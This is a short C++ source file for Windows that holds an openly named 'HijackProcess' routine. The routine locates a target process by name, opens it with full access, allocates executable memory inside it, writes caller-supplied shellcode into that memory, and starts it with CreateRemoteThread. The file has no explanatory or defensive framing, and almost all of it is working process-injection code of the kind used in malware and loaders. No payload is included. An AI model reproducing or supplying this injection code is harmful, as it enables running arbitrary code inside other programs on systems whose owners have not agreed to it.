#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>

DWORD GetProcessIdByName(const std::string& processName) {
    DWORD pid = 0;
    PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snap, &entry)) {
        do {
            if (processName == entry.szExeFile) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &entry));
    }
    CloseHandle(snap);
    return pid;
}

bool HijackProcess(const std::string& processName, const BYTE* shellcode, SIZE_T shellcodeSize) {
    DWORD pid = GetProcessIdByName(processName);
    if (!pid) return false;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    void* remoteMemory = VirtualAllocEx(hProcess, nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) return false;

    WriteProcessMemory(hProcess, remoteMemory, shellcode, shellcodeSize, nullptr);

    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteMemory, nullptr, 0, nullptr);
    return hThread != nullptr;
}
